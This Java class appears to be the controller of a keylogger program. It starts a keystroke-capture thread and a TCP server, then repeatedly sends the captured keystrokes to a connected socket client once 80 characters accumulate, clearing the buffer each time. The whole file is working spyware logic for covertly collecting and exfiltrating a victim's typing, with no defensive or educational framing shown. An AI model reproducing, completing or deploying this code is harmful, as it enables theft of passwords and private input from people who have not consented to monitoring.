package controller.logger;

import model.connection.TCPServer;
import model.program.KeyLogger;

import java.io.IOException;
import java.io.OutputStream;

public class LoggerServerController {

    private KeyLogger Logger;
    private TCPServer Server;

    public LoggerServerController() {
        this.Logger = new KeyLogger();
        this.Server = new TCPServer();
    }

    public void run(){
        Thread runKeyLogger = new Thread(() -> {
            this.Logger.startKeyLogger();
        });


        Thread runLogSender = new Thread(() -> {
            while (true) {
                try {
                    System.out.println(Logger.getLog());
                    if(validLog()) {
                        sendLog();
                        this.Logger.resetLog();
                    }
                    Thread.sleep(1000);
                } catch (IOException e) {
                    throw new RuntimeException(e);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        });

        runKeyLogger.start();
        this.Server.startConnection();
        runLogSender.start();
    }

    private boolean validLog() {
        return this.Logger.getLog().length() >= 80;
    }

    public void sendLog() throws IOException {
        OutputStream outputStream = this.Server.getClientSocket().getOutputStream();
        outputStream.write(this.Logger.getLog().getBytes());
    }


}
